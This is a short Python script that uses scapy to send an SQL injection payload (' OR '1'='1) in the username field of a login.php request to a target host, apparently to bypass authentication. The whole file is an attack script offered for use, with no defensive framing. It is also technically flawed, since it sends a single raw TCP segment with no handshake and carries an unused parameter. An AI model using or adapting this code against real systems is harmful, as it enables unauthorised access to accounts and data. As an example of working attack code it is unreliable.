from scapy.all import IP, TCP, Raw, send


def send_sqli_packet(target_ip, target_port=80, database="admin"):
    sqli_payload = "' OR '1'='1"
    
    sqli_http_request = (
        f"GET /login.php?username={sqli_payload}&password=anything HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        f"Connection: close\r\n\r\n"
        

        )
    
    packet = IP(src="192.168.1.100", dst=target_ip) / TCP(sport=54321, dport=target_port) / Raw(load=sqli_http_request)
    send(packet)
    print(f"[+] SQLi payload sent: {sqli_payload}")

#send_sqli_packet("192.168.1.50")
